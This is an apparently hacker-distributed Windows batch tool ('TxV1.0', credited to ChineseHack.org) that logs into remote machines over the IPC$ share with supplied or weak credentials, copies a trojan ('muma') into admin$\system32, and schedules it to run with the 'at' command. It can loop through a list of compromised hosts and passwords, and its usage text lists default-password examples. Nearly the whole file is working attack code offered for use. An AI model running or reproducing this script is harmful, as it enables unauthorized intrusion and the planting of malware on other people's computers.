@echo off
cls
Rem ==========================ipc.bat====================================
echo @echo off  >ipc.bat
echo echo.    >>ipc.bat
echo echo Connect %%1...    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ %%3 /user:%%2 ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo Transmitting... %%4    >>ipc.bat
echo echo.    >>ipc.bat
echo copy %%4 \\%%1\admin$\system32  /y ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo Query time of %%1   >>ipc.bat
echo echo.    >>ipc.bat
echo net Time \\%%1 /set /y ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo for /f "tokens=1,2 delims=:"  %%%%i in ("%%time%%") do set /a hh=%%%%i ^& set /a mm=%%%%j    >>ipc.bat
echo echo %%1 Current time is %%hh%%:%%mm%%    >>ipc.bat
echo set /a mm=%%mm%%+2    >>ipc.bat
echo if /i %%mm%% geq 60 set /a mm=0 ^& set /a hh=%%hh%%+1    >>ipc.bat
echo if /i %%hh%% geq 24 set /a hh=0    >>ipc.bat
echo set tm=%%hh%%:%%mm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo echo Set start %%4 time %%tm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% %%4  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo After 120 second£¬service will start£¬please wait...    >>ipc.bat
echo goto :BYE    >>ipc.bat
echo :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo %%1 Error£¬command fail !    >>ipc.bat
echo echo.    >>ipc.bat
echo goto :exit    >>ipc.bat
echo :BYE    >>ipc.bat
echo echo.    >>ipc.bat
echo echo %%1 Command success ! >>ipc.bat
echo echo.    >>ipc.bat
echo :exit    >>ipc.bat
echo echo ------------------------------------------------------    >>ipc.bat
echo exit   >>ipc.bat
Rem ==============================ipc.bat====================================

:Rem
if {%1}== {} goto :Usage
if {%2}== {} goto :Usage
if {%3}== {} (goto :Start) else ( if {%4}== {} goto :Usage ) 
echo ======================================================
echo                 TxV1.0           
echo ======================================================
start /b /wait ipc.bat %1 %2 %3 %4
goto :exit

:Usage
cls
echo ======================================================
echo                 TxV1.0           
echo ======================================================
echo                   Download by
echo                 ChineseHack.org
echo ======================================================
echo.
echo.
echo tx.bat [IP] [username] [password] [muma]
echo tx.bat [muma] [rouji.txt]
echo 192.168.0.1 user ""
echo 192.168.0.2 administrator 123
echo 192.168.0.24 administrator admin
echo.
echo ------------------------------------------------------
goto :exit

:Start
echo ======================================================
echo                 TxV1.0           
echo ======================================================
for /f "tokens=1-3 delims= "  %%i in (%2) do  start /b /wait ipc.bat %%i %%j %%k %1
:exit